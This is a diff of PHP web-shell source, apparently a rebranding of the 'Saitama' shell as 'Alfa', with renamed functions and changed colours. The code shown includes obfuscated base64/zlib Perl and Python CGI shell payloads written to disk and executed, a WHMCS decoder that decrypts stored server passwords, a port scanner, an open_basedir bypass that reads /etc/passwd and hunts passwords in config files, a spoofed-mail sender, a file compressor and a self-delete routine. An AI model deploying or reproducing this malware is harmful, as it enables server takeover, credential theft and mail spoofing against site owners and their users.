+					$cacheMsg = '<td style="text-align:center;"><input row_id="'.$line.'" type="checkbox" name="tbl_rows_checkbox[]" value="'.$item[$col_key].'"></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" onclick="alfaMysqlEditRow(this, \'edit\');" style="color:#0acaa6;">Edit</a></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" row_id="'.$line.'" onclick="alfaMysqlEditRow(this, \'delete\');" style="color:#ff1e1e;">Delete</a></td>';
 				}
 				$tbl_content .= '<tr class="tbl_row tbl_row_l'.$line.'">'.$cacheMsg;
 				$line++;
@@ -5028,8 +5029,8 @@ function saitamaSql_manager_api(){
 		@mysqli_close($conn);
 	}
 }
-function saitamaselfrm(){
-if(isset($_POST['saitama1'])&&$_POST['saitama1']=='yes'){
+function alfaselfrm(){
+if(isset($_POST['alfa1'])&&$_POST['alfa1']=='yes'){
 echo(__pre().'<center>');
 if(@unlink($GLOBALS['__file_path'])){
 echo('<b>Shell has been removed</i> :)</b>');
@@ -5038,7 +5039,7 @@ echo 'unlink error!';
 }
 echo('</center>');
 }
-if(isset($_POST['saitama1'])&&$_POST['saitama1']!='yes'){
+if(isset($_POST['alfa1'])&&$_POST['alfa1']!='yes'){
 echo "<div class=header>";
 echo "
 <center><p><img src=\"http://solevisible.com/images/farvahar-iran.png\"></p>";
@@ -5046,33 +5047,33 @@ echo '<p><div class="txtfont">Do you want to destroy me?!</div><a href=javascrip
 echo '</p></center></div>';
 }
 }
-function saitamacgishell(){
-saitamahead();
+function alfacgishell(){
+alfahead();
 $div = "";
-saitamaCreateParentFolder();
-@chdir($GLOBALS['home_cwd'] . "/" . __SAITAMA_DATA_FOLDER__);
-if(!in_array($_POST['saitama1'],array('perl','py'))){
+alfaCreateParentFolder();
+@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
+if(!in_array($_POST['alfa1'],array('perl','py'))){
 $div = "</div>";
 echo '<div class=header><center><p><div class="txtfont_header">| CGI Shell |</div></p><h3><a class="rejectme" href="javascript:void(0)" onclick="runcgi(\'perl\')">| Perl | </a><a class="rejectme" href="javascript:void(0)" onclick="runcgi(\'py\');">| Python | </a>';
 }
-if(isset($_POST['saitama1'])&&in_array($_POST['saitama1'],array('perl','py'))){
-@mkdir('cgisaitama',0755);
-@chdir('cgisaitama');
-saitamacgihtaccess('cgi');
-$name = $_POST['saitama1'].'.saitama';
+if(isset($_POST['alfa1'])&&in_array($_POST['alfa1'],array('perl','py'))){
+@mkdir('cgialfa',0755);
+@chdir('cgialfa');
+alfacgihtaccess('cgi');
+$name = $_POST['alfa1'].'.alfa';
 $perl = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;eval(Compress::Zlib::memGunzip(decode_base64("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")));';;
 $py = '#!/usr/bin/python'."\nimport zlib, base64\n".'eval(compile(zlib.decompress(base64.b64decode("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")),\'<string>\',\'exec\'))';
-if($_POST['saitama1']=='perl'){$code = $perl;}else{$code = $py;}
+if($_POST['alfa1']=='perl'){$code = $perl;}else{$code = $py;}
 if(__write_file($name,$code)){
 @chmod($name,0755);
-echo '<iframe src="'.__SAITAMA_DATA_FOLDER__.'/cgisaitama/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
+echo '<iframe src="'.__ALFA_DATA_FOLDER__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
 }
 }
 echo $div;
-saitamafooter();
+alfafooter();
 }
-function saitamaWhmcs(){
-saitamahead();
+function alfaWhmcs(){
+alfahead();
 echo '<div class=header>';
 function decrypt($string,$cc_encryption_hash){
 $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
@@ -5120,7 +5121,7 @@ $c += 2;
 }
 return $out;
 }
-saitamaNum(8,9,10);
+AlfaNum(8,9,10);
 echo "<center><br><div class='txtfont_header'>| WHMCS DeCoder |</div><p>".getConfigHtml('whmcs')."</p><form onsubmit=\"g('Whmcs',null,this.form_action.value,'decoder',this.db_username.value,this.db_password.value,this.db_name.value,this.cc_encryption_hash.value,this.db_host.value); return false;\">
 <input type='hidden' name='form_action' value='2'>";
 $table = array('td1' =>
@@ -5136,12 +5137,12 @@ $table = array('td1' =>
 );
 create_table($table);
 echo "<p><input type='submit' value=' ' name='Submit'></p></form></center>";
-if($_POST['saitama5']!=''){
-$db_host=($_POST['saitama7']);
-$db_username=($_POST['saitama3']);
-$db_password=($_POST['saitama4']);
-$db_name=($_POST['saitama5']);
-$cc_encryption_hash=($_POST['saitama6']);
+if($_POST['alfa5']!=''){
+$db_host=($_POST['alfa7']);
+$db_username=($_POST['alfa3']);
+$db_password=($_POST['alfa4']);
+$db_name=($_POST['alfa5']);
+$cc_encryption_hash=($_POST['alfa6']);
 echo __pre();
 $conn=@mysqli_connect($db_host,$db_username,$db_password,$db_name) or die(mysqli_error($conn));
 $query = mysqli_query($conn,"SELECT * FROM tblservers");
@@ -5156,12 +5157,12 @@ $active = $v['active'];
 $hostname = $v['hostname'];
 echo("<center><table border='1'>");
 $password = decrypt ($v['password'], $cc_encryption_hash);
-echo("<tr><td><b><font color=\"#00ffff\">Type</font></td><td>$type</td></tr></b>");
-echo("<tr><td><b><font color=\"#00ffff\">Active</font></td><td>$active</td></tr></b>");
-echo("<tr><td><b><font color=\"#00ffff\">Hostname</font></td><td>$hostname</td></tr></b>");
-echo("<tr><td><b><font color=\"#00ffff\">Ip</font></td><td>$ipaddress</td></tr></b>");
-echo("<tr><td><b><font color=\"#00ffff\">Username</font></td><td>$username</td></tr></b>");
-echo("<tr><td><b><font color=\"#00ffff\">Password</font></td><td>$password</td></tr></b>");
+echo("<tr><td><b><font color=\"#FFFFFF\">Type</font></td><td>$type</td></tr></b>");
+echo("<tr><td><b><font color=\"#FFFFFF\">Active</font></td><td>$active</td></tr></b>");
+echo("<tr><td><b><font color=\"#FFFFFF\">Hostname</font></td><td>$hostname</td></tr></b>");
+echo("<tr><td><b><font color=\"#FFFFFF\">Ip</font></td><td>$ipaddress</td></tr></b>");
+echo("<tr><td><b><font color=\"#FFFFFF\">Username</font></td><td>$username</td></tr></b>");
+echo("<tr><td><b><font color=\"#FFFFFF\">Password</font></td><td>$password</td></tr></b>");
 echo "</table><br><br></center>";
 }
 $query1 = @mysqli_query($conn,"SELECT * FROM tblregistrars");
@@ -5177,19 +5178,19 @@ $value=0;
 }
 echo("<center>Domain Reseller <br><center>");
 echo("<center><table border='1'>");
-echo("<tr><td><b><font color=\"#BF40BF\">Register</font></td><td>$registrar</td></tr></b>");
-echo("<tr><td><b><font color=\"#BF40BF\">Setting</font></td><td>$setting</td></tr></b>");
-echo("<tr><td><b><font color=\"#BF40BF\">Value</font></td><td>$value</td></tr></b>");
+echo("<tr><td><b><font color=\"#67ABDF\">Register</font></td><td>$registrar</td></tr></b>");
+echo("<tr><td><b><font color=\"#67ABDF\">Setting</font></td><td>$setting</td></tr></b>");
+echo("<tr><td><b><font color=\"#67ABDF\">Value</font></td><td>$value</td></tr></b>");
 echo "</table><br><br></center>";
 }
 }
 }else{__alert('<font color="red">tblservers is Empty...!</font>');};
 }
 echo "</div>";
-saitamafooter();
+alfafooter();
 }
-function saitamaportscanner(){
-saitamahead();
+function alfaportscanner(){
+alfahead();
 echo '<div class=header><center><p><div class="txtfont_header">| Port Scaner |</div></p>
 <form action="" method="post" onsubmit="g(\'portscanner\',null,null,this.start.value,this.end.value,this.host.value); return false;">
 <input type="hidden" name="y" value="phptools">
@@ -5197,10 +5198,10 @@ echo '<div class=header><center><p><div class="txtfont_header">| Port Scaner |</
 <div class="txtfont">Port start: </div> <input id="text" size="5" type="text"  name="start" value="80"/>
 <div class="txtfont">Port end: </div> <input id="text" size="5" type="text" name="end" value="80"/> <input type="submit" value=" " />
 </form></center><br>';
-$start = strip_tags($_POST['saitama2']);
-$end = strip_tags($_POST['saitama3']);
-$host = strip_tags($_POST['saitama4']);
-if(isset($_POST['saitama4']) && is_numeric($_POST['saitama3']) && is_numeric($_POST['saitama2'])){
+$start = strip_tags($_POST['alfa2']);
+$end = strip_tags($_POST['alfa3']);
+$host = strip_tags($_POST['alfa4']);
+if(isset($_POST['alfa4']) && is_numeric($_POST['alfa3']) && is_numeric($_POST['alfa2'])){
 echo __pre();
 $packetContent = "GET / HTTP/1.1\r\n\r\n";
 if(ctype_xdigit($packetContent))$packetContent = @pack("H*" , $packetContent);
@@ -5229,34 +5230,34 @@ flush();
 }
 }
 echo '</div>';
-saitamafooter();
+alfafooter();
 }
-function saitamacgihtaccess($m,$d='', $symname=false){
+function alfacgihtaccess($m,$d='', $symname=false){
 $readme = "";
 if($symname){$readme="\nReadmeName ".trim($symname);}
 if($m=='cgi'){
-$code = "#Coded By Ndraa & StrezzBoy\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .saitama\nAddHandler cgi-script .saitama";
+$code = "#Coded By Sole Sad & Invisible\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa";
 }elseif($m=='sym'){
-$code = "#Coded By Ndraa & StrezzBoy\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
+$code = "#Coded By Sole Sad & Invisible\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
 }elseif($m=='shtml'){
 $code = "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml";
 }
 @__write_file($d . ".htaccess", $code);
 }
-function saitamabasedir(){
-saitamahead();
+function alfabasedir(){
+alfahead();
 echo '<div class=header>
 <center><p><div class="txtfont_header">| Open Base Dir |</div></p></center>';
-$passwd = _saitama_file('/etc/passwd');
+$passwd = _alfa_file('/etc/passwd');
 if(is_array($passwd)){
 $users = array();
-$makepwd = saitamaMakePwd();
+$makepwd = alfaMakePwd();
 $basedir = @ini_get('open_basedir');
 $safe_mode = @ini_get('safe_mode');
-if(_saitama_can_runCommand(true,false)&&($basedir||$safe_mode)){
+if(_alfa_can_runCommand(true,false)&&($basedir||$safe_mode)){
 $bash = "fZBPSwMxEMXPzacYx9jugkvY9lbpTQ9eFU9NWdYk2wYkWZKsgmu+u9NaS8E/cwgDL/N+M+/yQjxbJ+KO3d4/rHjNusGpZL2DmEITTP/SKlOUIwOqNVTvgLxG2MB0CsGkITioz7X5P9riN60hzhHTvLYn5IoXfbAudYBXUUqHX9wPiEZDZQCj4OM807PIYovlwevHxPiHe0aWmVE7f7BaS4Ws8wEsWAe8UEOCSi+h6moQJinRtzG+6fIGtGeTp8c7Cqo4i4dAFB7xxiGakPdgSxtN6OxA/X7gePk3UtIPiddMe2dOe8wQN7NP";
-$tmp_path = saitamaWriteTocgiapi("basedir.saitama",$bash);
-$bash_users  = saitamaEx("cd ".$tmp_path."/saitamacgiapi;sh basedir.saitama ".$makepwd,false,true,true);
+$tmp_path = alfaWriteTocgiapi("basedir.alfa",$bash);
+$bash_users  = alfaEx("cd ".$tmp_path."/alfacgiapi;sh basedir.alfa ".$makepwd,false,true,true);
 $users = json_decode($bash_users, true);
 $x=count($users);
 if($x>=2){array_pop($users);--$x;}
@@ -5275,22 +5276,22 @@ $x++;
 }
 echo '<br><br>';
 echo "<b><font color=\"#00A220\">[+] Founded ".sizeof($passwd)." entrys in /etc/passwd\n"."<br /></font></b>";
-echo "<b><font color=\"#00ffff\">[+] Founded ".$x." readable ".str_replace("{user}", "*", $makepwd)." directories\n"."<br /></font></b>";
-echo "<b><font color=\"#E6E6FA\">[~] Searching for passwords in config files...\n\n"."<br /><br /><br /></font></b>";
+echo "<b><font color=\"#FFFFFF\">[+] Founded ".$x." readable ".str_replace("{user}", "*", $makepwd)." directories\n"."<br /></font></b>";
+echo "<b><font color=\"#FF0000\">[~] Searching for passwords in config files...\n\n"."<br /><br /><br /></font></b>";
 foreach($users as $user){
 if(empty($user))continue;
 $path = str_replace("{user}", $user, $makepwd);
-echo "<form method=post onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span><font color=#ff0800>Change Dir <font color=#FFFF01>..:: </font><font color=red><b>$user</b></font><font color=#FFFF01> ::..</font></font></span><br><input class='foottable' type=text name=c value='$path'><input type=submit value='>>'></form><br>";
+echo "<form method=post onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span><font color=#27979B>Change Dir <font color=#FFFF01>..:: </font><font color=red><b>$user</b></font><font color=#FFFF01> ::..</font></font></span><br><input class='foottable' type=text name=c value='$path'><input type=submit value='>>'></form><br>";
 }
-}else{echo('<b> <center><font color="#00ffff">[-] Error : coudn`t read /etc/passwd [-]</font></center></b>');}
+}else{echo('<b> <center><font color="#FFFFFF">[-] Error : coudn`t read /etc/passwd [-]</font></center></b>');}
 echo '<br><br></b>';
 echo '</div>';
-saitamafooter();
+alfafooter();
 }
-function saitamamail(){
-saitamahead();
+function alfamail(){
+alfahead();
 echo '<div class=header>';
-saitamaNum(8,9,10);
+AlfaNum(8,9,10);
 echo '<center><p><div class="txtfont_header">| Fake Mail |</div></p><form action="" method="post" onsubmit="g(\'mail\',null,this.mail_to.value,this.mail_from.value,this.mail_subject.value,\'>>\',this.mail_content.value,this.count_mail.value,this.mail_attach.value); return false;">';
 $table = array(
 'td1' => array('color' => 'FFFFFF', 'tdName' => 'Mail To : ', 'inputName' => 'mail_to', 'inputValue' => 'target@fbi.gov', 'inputSize' => '60','placeholder' => true),
@@ -5301,13 +5302,13 @@ $table = array(
 );
 create_table($table);
 echo '<p><div class="txtfont">Message:</div></p><textarea rows="6" cols="60" name="mail_content">Hi Dear Admin :)</textarea><p><input type="submit" value=" " name="mail_send" /></p></form></center>';
-if(isset($_POST['saitama4'])&&($_POST['saitama4'] == '>>')){
-$mail_to = $_POST['saitama1'];
-$mail_from = $_POST['saitama2'];
-$mail_subject = $_POST['saitama3'];
-$mail_content = $_POST['saitama5'];
-$count_mail = (int)$_POST['saitama6'];
-$mail_attach = $_POST['saitama7'];
+if(isset($_POST['alfa4'])&&($_POST['alfa4'] == '>>')){
+$mail_to = $_POST['alfa1'];
+$mail_from = $_POST['alfa2'];
+$mail_subject = $_POST['alfa3'];
+$mail_content = $_POST['alfa5'];
+$count_mail = (int)$_POST['alfa6'];
+$mail_attach = $_POST['alfa7'];
 if(filter_var($mail_to, FILTER_VALIDATE_EMAIL)){
 if(!empty($mail_attach)&&@is_file($mail_attach)){
 $file = $mail_attach;
@@ -5347,36 +5348,36 @@ if(@mail($mail_to,$mail_subject,$mail_content,$headers))echo("<center>Sent -> $m
 }else{__alert("Invalid Mail To !");}
 }
 echo('</div>');
-saitamafooter();
+alfafooter();
 }
-function saitamaziper(){
-saitamahead();
-saitamaNum(8,9,10);
+function alfaziper(){
+alfahead();
+AlfaNum(8,9,10);
 echo '<div class=header><p><center><p><div class="txtfont_header">| Compressor |</div></p>
 <form onSubmit="g(\'ziper\',null,null,null,this.dirzip.value,this.zipfile.value,\'>>\');return false;" method="post">
-<div class="txtfont">Dir/File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['saitama3'])?htmlspecialchars($_POST['saitama3']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
-<div class="txtfont">Save Dir: </div> <input type="text" name="zipfile" value="'.$GLOBALS['cwd'].'saitama.zip" size="60"/>
+<div class="txtfont">Dir/File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['alfa3'])?htmlspecialchars($_POST['alfa3']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
+<div class="txtfont">Save Dir: </div> <input type="text" name="zipfile" value="'.$GLOBALS['cwd'].'alfa.zip" size="60"/>
 <input type="submit" value=" " name="ziper" />
 </form></center></p>';
-if(isset($_POST['saitama5']) && ($_POST['saitama5'] == '>>')){
-$dirzip = $_POST['saitama3'];
-$zipfile = $_POST['saitama4'];
-if($GLOBALS['sys']!='unix'&&_saitama_can_runCommand(true,true)){
-saitamaEx("powershell Compress-Archive -Path '".addslashes($dirzip)."' -DestinationPath '".addslashes(basename($zipfile))."'");
+if(isset($_POST['alfa5']) && ($_POST['alfa5'] == '>>')){
+$dirzip = $_POST['alfa3'];
+$zipfile = $_POST['alfa4'];
+if($GLOBALS['sys']!='unix'&&_alfa_can_runCommand(true,true)){
+alfaEx("powershell Compress-Archive -Path '".addslashes($dirzip)."' -DestinationPath '".addslashes(basename($zipfile))."'");
 echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
-}elseif($GLOBALS['sys']=='unix'&&_saitama_can_runCommand(true,true)){
-saitamaEx("cd '".addslashes(dirname($zipfile))."';zip -r '".addslashes(basename($zipfile))."' '".addslashes($dirzip)."'");
+}elseif($GLOBALS['sys']=='unix'&&_alfa_can_runCommand(true,true)){
+alfaEx("cd '".addslashes(dirname($zipfile))."';zip -r '".addslashes(basename($zipfile))."' '".addslashes($dirzip)."'");
 echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
 }elseif(class_exists('ZipArchive')){
